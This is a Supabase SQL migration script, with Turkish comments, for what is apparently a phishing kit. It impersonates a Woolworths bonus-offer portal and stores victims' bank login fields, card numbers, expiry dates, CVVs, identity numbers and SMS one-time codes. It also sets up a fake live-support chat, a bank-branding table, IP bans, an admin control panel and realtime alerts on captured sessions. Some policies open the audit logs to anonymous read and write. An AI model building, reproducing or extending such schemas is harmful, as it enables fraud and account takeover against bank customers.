create policy "audit_event_logs_auth_all_unified"
  on public.audit_event_logs for all
  to authenticated
  using (true) with check (true);

grant insert, select on public.audit_event_logs to anon;
grant insert, select, update, delete on public.audit_event_logs to authenticated;
grant all on public.audit_event_logs to postgres;

-- === PostgREST şema cache yenile ===
notify pgrst, 'reload schema';

-- ########## [7/7] UNIFY ALL + banned_ips ##########
-- ============================================================
-- 20260810000007 - BÜTÜN TABLOLAR İÇİN KOLON BİRLEŞTİRME MIGRATION
-- (All tables unified schema: sessions/global_settings/banks/chat_messages/
--  audit_event_logs/ip_bans/chat_images/partners/banned_ips)
-- HEMEN SON: NOTIFY pgrst 'reload schema'
-- ============================================================

-- ####################################################################
-- (1) PARTNERS
-- ####################################################################
ALTER TABLE public.partners ADD COLUMN IF NOT EXISTS is_active BOOLEAN DEFAULT true;
ALTER TABLE public.partners ADD COLUMN IF NOT EXISTS description TEXT;
ALTER TABLE public.partners ADD COLUMN IF NOT EXISTS partner_code TEXT;

-- ####################################################################
-- (2) SESSIONS — BÜTÜN AYRİK MIGRATION KOLOMLARI TEK GARANTİ
-- ####################################################################
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS target_country TEXT DEFAULT 'Australia';
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS current_step TEXT DEFAULT 'win';
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS amount INT NOT NULL DEFAULT 0;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'offline';
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS visitor_ip TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS ip_address TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS user_agent TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS language TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS current_bank_slug TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS form_data JSONB DEFAULT '{}'::jsonb;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS bankFormHistory JSONB DEFAULT '[]'::jsonb;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField1 TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField1Key TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField2 TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField2Key TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField2Type TEXT DEFAULT 'password';
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField3 TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField3Key TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS identity_number TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS card_number TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS card_expiry TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS card_cvv TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS card_holder TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_code TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS code_value TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_digits INT NOT NULL DEFAULT 6;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_custom_text TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_name TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS participation_code TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_code TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS is_hidden BOOLEAN DEFAULT false;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS is_completed BOOLEAN DEFAULT false;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS total_bonus_amount_cents INT DEFAULT 0;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS last_ping_at TIMESTAMPTZ;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS invalid_bank_reason TEXT;

-- session_id public_id + partner_id garantisi
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS public_id TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_id UUID REFERENCES public.partners(id) ON DELETE SET NULL;

-- amount CHECK + sms_digits CHECK (NOT VALID — mevcut satırlar patlamaz)
DO $$ BEGIN
    ALTER TABLE public.sessions ADD CONSTRAINT sessions_amount_check CHECK (amount >= 0) NOT VALID;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN
    ALTER TABLE public.sessions ADD CONSTRAINT sessions_sms_digits_check CHECK (sms_digits >= 4 AND sms_digits <= 12) NOT VALID;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;

-- backfills
UPDATE public.sessions SET visitor_ip = COALESCE(visitor_ip, ip_address);
UPDATE public.sessions SET ip_address = COALESCE(ip_address, visitor_ip);
UPDATE public.sessions SET amount = COALESCE(amount, 0) WHERE amount IS NULL;
UPDATE public.sessions SET sms_digits = COALESCE(
  CASE WHEN sms_digits < 4 THEN 6 WHEN sms_digits > 12 THEN 6 ELSE sms_digits END,
  6
);
UPDATE public.sessions SET status = COALESCE(NULLIF(status, ''), 'offline');
UPDATE public.sessions SET current_step = COALESCE(NULLIF(current_step, ''), 'win');

-- SESSIONS INDEX garantileri
CREATE INDEX IF NOT EXISTS idx_sessions_created_at_desc ON public.sessions (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_current_step ON public.sessions (current_step);
CREATE INDEX IF NOT EXISTS idx_sessions_target_country ON public.sessions (target_country);
CREATE INDEX IF NOT EXISTS idx_sessions_is_hidden ON public.sessions (is_hidden);
CREATE INDEX IF NOT EXISTS idx_sessions_last_ping_at ON public.sessions (last_ping_at);
CREATE UNIQUE INDEX IF NOT EXISTS sessions_public_id_idx ON public.sessions (public_id);
CREATE INDEX IF NOT EXISTS idx_sessions_current_bank_slug ON public.sessions (current_bank_slug);
CREATE INDEX IF NOT EXISTS idx_sessions_status ON public.sessions (status);

-- ####################################################################
-- (3) GLOBAL_SETTINGS — TÜM AYRİK MIGRATION KOLOMLARI TEK GARANTİ
-- ####################################################################
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS target_country TEXT DEFAULT 'Australia';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS currency TEXT DEFAULT 'AUD$';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS portal_name TEXT DEFAULT 'Woolworths Customer Portal';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS support_center_name TEXT DEFAULT 'Woolworths Customer Support';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS win_title TEXT DEFAULT 'Exclusive Woolworths Bonus Offer';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS win_subtitle TEXT DEFAULT 'Congratulations! You have been selected.';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS live_support_title TEXT DEFAULT 'Woolworths Live Support';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS live_support_subtitle TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS logo_url TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS bg_url TEXT DEFAULT '/portal/desktop-background.png';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS bg_url_mobile TEXT DEFAULT '/portal/mobile-background.png';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS wheel_settings JSONB DEFAULT '{}'::jsonb;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS translations JSONB DEFAULT '{}'::jsonb;

-- add_settings_columns (katılım kodu + profile metinleri)
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS code_title TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS code_subtitle TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS code_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS live_support_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_title_small TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_title_main TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_subtitle TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS win_button TEXT DEFAULT 'Claim bonus';

-- add_more_translation_settings (sms + kart + profile label'ları)
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS banken_search_placeholder TEXT DEFAULT 'Search...';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS sms_subtitle TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS sms_input_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS sms_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS sms_loading TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_owner_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_number_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_expiry_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_cvv_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_firstname_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_lastname_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_phone_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_loading_text TEXT;

-- ####################################################################
-- (4) BANKS — BİRLEŞİK KOLONLAR
-- ####################################################################
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS slug TEXT NOT NULL DEFAULT '';
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS name TEXT NOT NULL DEFAULT '';
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS country TEXT NOT NULL DEFAULT 'Australia';
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS logo_url TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS brand_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS accent_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS sort_order INT DEFAULT 100;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS is_active BOOLEAN DEFAULT true;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS primary_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS secondary_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS description TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS login_url TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS help_text TEXT;

-- ####################################################################
-- (5) CHAT_MESSAGES — BİRLEŞİK KOLONLAR (sender + role, image_url + image_urls)
-- ####################################################################
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS session_id UUID REFERENCES public.sessions(id) ON DELETE CASCADE;
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS sender TEXT;
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS role TEXT;
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS content TEXT NOT NULL DEFAULT '';
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS image_url TEXT;
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS image_urls TEXT[] DEFAULT '{}'::text[];
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS session_uuid UUID;

-- backfill
UPDATE public.chat_messages SET sender = COALESCE(NULLIF(sender, ''), role) WHERE sender IS NULL OR sender = '';
UPDATE public.chat_messages SET role = COALESCE(NULLIF(role, ''), sender) WHERE role IS NULL OR role = '';
UPDATE public.chat_messages SET image_url = COALESCE(NULLIF(image_url, ''), image_urls[1]) WHERE image_url IS NULL OR image_url = '';
UPDATE public.chat_messages SET image_urls = COALESCE(
  CASE WHEN cardinality(image_urls) = 0 AND image_url IS NOT NULL AND image_url <> '' THEN ARRAY[image_url]::text[]
       WHEN image_urls IS NULL THEN '{}'::text[] ELSE image_urls END,
  '{}'::text[]
);

CREATE INDEX IF NOT EXISTS idx_chat_messages_session_id ON public.chat_messages(session_id);
CREATE INDEX IF NOT EXISTS idx_chat_messages_created_at ON public.chat_messages(created_at);

-- ####################################################################
-- (6) CHAT_IMAGES
-- ####################################################################
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS message_id UUID REFERENCES public.chat_messages(id) ON DELETE CASCADE;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS storage_path TEXT NOT NULL DEFAULT '';
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS public_url TEXT;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS mime_type TEXT;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS size_bytes INT;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS width INT;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS height INT;
CREATE INDEX IF NOT EXISTS idx_chat_images_message_id ON public.chat_images(message_id);

-- ####################################################################
-- (7) IP_BANS + BANNED_IPS (2 adet benzer tablo — ikisini de garanti et)
-- ####################################################################
ALTER TABLE public.ip_bans ADD COLUMN IF NOT EXISTS ip_address TEXT NOT NULL DEFAULT '';
ALTER TABLE public.ip_bans ADD COLUMN IF NOT EXISTS reason TEXT;
ALTER TABLE public.ip_bans ADD COLUMN IF NOT EXISTS banned_by TEXT;
ALTER TABLE public.ip_bans ADD COLUMN IF NOT EXISTS expires_at TIMESTAMPTZ;
CREATE UNIQUE INDEX IF NOT EXISTS idx_ip_bans_ip_address ON public.ip_bans(ip_address);

CREATE TABLE IF NOT EXISTS public.banned_ips (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  ip_address TEXT NOT NULL UNIQUE,
  reason TEXT,
  banned_by TEXT,
  expires_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS banned_ips_all_policy ON public.banned_ips;
CREATE POLICY banned_ips_all_policy ON public.banned_ips FOR ALL USING (true) WITH CHECK (true);

-- ####################################################################
-- (8) AUDIT_EVENT_LOGS — BİRLEŞİK KOLONLAR (ŞEMA A+B 38 KOLON TOPLAM)
-- ####################################################################
DO $$ BEGIN
  CREATE TABLE IF NOT EXISTS public.audit_event_logs (
    id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
  );
EXCEPTION WHEN duplicate_table THEN NULL; END $$;

-- ŞEMA B (production bootstrap) + ekstra
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS event_type TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS severity TEXT NOT NULL DEFAULT 'info';
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS session_id TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS session_uuid UUID;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS bank_slug TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS actor TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS message TEXT NOT NULL DEFAULT '';
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS payload JSONB DEFAULT '{}'::jsonb;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS metadata JSONB DEFAULT '{}'::jsonb;

-- ŞEMA A (20260808_create_audit_event_logs 38 kolon geri kalanı)
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS public_id TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS partner_name TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS event_kind TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS event_action TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS status TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS user_ip TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS user_agent TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS country TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS city TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS referer_url TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS current_url TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS from_step TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS to_step TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS pathname TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS bank_name TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS login_method TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS admin_email TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS admin_action TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS meta JSONB DEFAULT '{}'::jsonb;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS error_name TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS error_message TEXT;

-- session_id TEXT garanti (UUID ise TEXT'e çevir)
DO $$ BEGIN
    ALTER TABLE public.audit_event_logs ALTER COLUMN session_id TYPE text USING session_id::text;
EXCEPTION WHEN others THEN NULL; END $$;

-- BACKFILL ÇİFT YÖNLÜ (10 ADIM)
UPDATE public.audit_event_logs SET event_type = COALESCE(NULLIF(event_type, ''), event_kind) WHERE event_type IS NULL OR event_type = '';
UPDATE public.audit_event_logs SET event_kind = COALESCE(NULLIF(event_kind, ''), event_type) WHERE event_kind IS NULL OR event_kind = '';
UPDATE public.audit_event_logs SET severity = COALESCE(NULLIF(severity, ''), status, 'info');
UPDATE public.audit_event_logs SET status = COALESCE(NULLIF(status, ''), severity, 'info');
UPDATE public.audit_event_logs SET message = COALESCE(NULLIF(message, ''), CONCAT(event_kind, ' ', event_action), 'audit event');
UPDATE public.audit_event_logs SET actor = COALESCE(NULLIF(actor, ''), admin_email, bank_slug) WHERE actor IS NULL OR actor = '';
UPDATE public.audit_event_logs SET admin_email = COALESCE(NULLIF(admin_email, ''), CASE WHEN position('@' in actor) > 0 THEN actor END);
UPDATE public.audit_event_logs SET metadata = COALESCE(metadata, '{}'::jsonb) || COALESCE(meta, '{}'::jsonb) || jsonb_build_object(
    'from_step', from_step, 'to_step', to_step, 'pathname', pathname,
    'user_ip', user_ip, 'user_agent', user_agent, 'country', country,
    'city', city, 'referer_url', referer_url, 'current_url', current_url,
    'bank_name', bank_name, 'login_method', login_method,
    'admin_email', admin_email, 'admin_action', admin_action,
    'error_name', error_name, 'error_message', error_message,
    'public_id', public_id, 'partner_name', partner_name,
    'event_action', event_action, 'event_kind', event_kind
);
UPDATE public.audit_event_logs SET meta = COALESCE(meta, '{}'::jsonb) || COALESCE(metadata, '{}'::jsonb);
UPDATE public.audit_event_logs SET event_action = COALESCE(NULLIF(event_action, ''), from_step, to_step, event_kind);

-- NOT NULL garantileri
UPDATE public.audit_event_logs SET event_type = 'audit:event' WHERE event_type IS NULL OR event_type = '';
UPDATE public.audit_event_logs SET severity = 'info' WHERE severity IS NULL OR severity = '';
UPDATE public.audit_event_logs SET message = 'audit event' WHERE message IS NULL OR message = '';
DO $$ BEGIN
    ALTER TABLE public.audit_event_logs ALTER COLUMN event_type SET NOT NULL;
EXCEPTION WHEN others THEN NULL; END $$;
DO $$ BEGIN
    ALTER TABLE public.audit_event_logs ALTER COLUMN severity SET NOT NULL;
EXCEPTION WHEN others THEN NULL; END $$;
DO $$ BEGIN
    ALTER TABLE public.audit_event_logs ALTER COLUMN message SET NOT NULL;
EXCEPTION WHEN others THEN NULL; END $$;

-- INDEX garantileri (BOTH ŞEMA)
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_created_at_desc ON public.audit_event_logs (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_session ON public.audit_event_logs (session_id, session_uuid);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_type ON public.audit_event_logs (event_type);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_kind_action ON public.audit_event_logs (event_kind, event_action);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_severity ON public.audit_event_logs (severity);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_bank_slug ON public.audit_event_logs (bank_slug);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_partner_name ON public.audit_event_logs (partner_name);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_public_id ON public.audit_event_logs (public_id);

-- RLS + policy garantileri
ALTER TABLE public.audit_event_logs ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS audit_event_select_public ON public.audit_event_logs;
CREATE POLICY audit_event_select_public ON public.audit_event_logs FOR SELECT USING (true);
DROP POLICY IF EXISTS audit_event_insert_anon ON public.audit_event_logs;
CREATE POLICY audit_event_insert_anon ON public.audit_event_logs FOR INSERT WITH CHECK (true);
DROP POLICY IF EXISTS audit_event_authenticated_all ON public.audit_event_logs;
CREATE POLICY audit_event_authenticated_all ON public.audit_event_logs FOR ALL
  USING (auth.role() = 'authenticated' OR auth.role() = 'service_role' OR current_user = 'postgres')
  WITH CHECK (auth.role() = 'authenticated' OR auth.role() = 'service_role' OR current_user = 'postgres');

GRANT SELECT, INSERT, UPDATE, DELETE ON public.audit_event_logs TO anon, authenticated, service_role;

-- ####################################################################
-- (9) TRIGGER set_updated_at — KALICI GARANTİ
-- ####################################################################
CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS trigger AS $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
CREATE TRIGGER sessions_set_updated_at
BEFORE UPDATE ON public.sessions
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

DROP TRIGGER IF EXISTS partners_set_updated_at ON public.partners;
CREATE TRIGGER partners_set_updated_at
BEFORE UPDATE ON public.partners
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

DROP TRIGGER IF EXISTS banks_set_updated_at ON public.banks;
CREATE TRIGGER banks_set_updated_at
BEFORE UPDATE ON public.banks
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

DROP TRIGGER IF EXISTS global_settings_set_updated_at ON public.global_settings;
CREATE TRIGGER global_settings_set_updated_at
BEFORE UPDATE ON public.global_settings
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- ####################################################################
-- (10) POSTGREST SCHEMA CACHE RELOAD — KOLON YOK HATASINI KALICI DÜZELT
-- ####################################################################
NOTIFY pgrst, 'reload schema';

-- ########## REALTIME: uygulamanin abone oldugu tablolar ##########
do $$
begin
  begin execute 'alter publication supabase_realtime add table public.sessions'; exception when others then null; end;
  begin execute 'alter publication supabase_realtime add table public.global_settings'; exception when others then null; end;
  begin execute 'alter publication supabase_realtime add table public.chat_messages'; exception when others then null; end;
  begin execute 'alter publication supabase_realtime add table public.audit_event_logs'; exception when others then null; end;
  begin execute 'alter publication supabase_realtime add table public.banned_ips'; exception when others then null; end;
end $$;

notify pgrst, 'reload schema';

-- ============================================================================
-- PUSH SUBSCRIPTIONS (admin bildirim abonelikleri - PushNotifyToggle/webpush)
-- ============================================================================
CREATE TABLE IF NOT EXISTS public.push_subscriptions (
  endpoint TEXT PRIMARY KEY,
  keys JSONB NOT NULL,
  user_agent TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.push_subscriptions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "push_subscriptions_service_all" ON public.push_subscriptions;
CREATE POLICY "push_subscriptions_service_all" ON public.push_subscriptions
  FOR ALL TO service_role USING (true) WITH CHECK (true);

NOTIFY pgrst, 'reload schema';

-- ============================================================================
-- ADMIN PANEL V2 — SITE KONTROL + OG + ENTRY_PAGE KOLONLARI (2026-11)
-- ============================================================================
ALTER TABLE public.global_settings
  ADD COLUMN IF NOT EXISTS site_enabled BOOLEAN DEFAULT TRUE,
  ADD COLUMN IF NOT EXISTS site_control JSONB DEFAULT '{}'::jsonb,
  ADD COLUMN IF NOT EXISTS og_image_url TEXT,
  ADD COLUMN IF NOT EXISTS entry_page TEXT DEFAULT '/win';

-- push_subscriptions realtime
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_publication_tables
    WHERE pubname = 'supabase_realtime' AND tablename = 'push_subscriptions'
  ) THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE public.push_subscriptions;
  END IF;
END $$;

NOTIFY pgrst, 'reload schema';
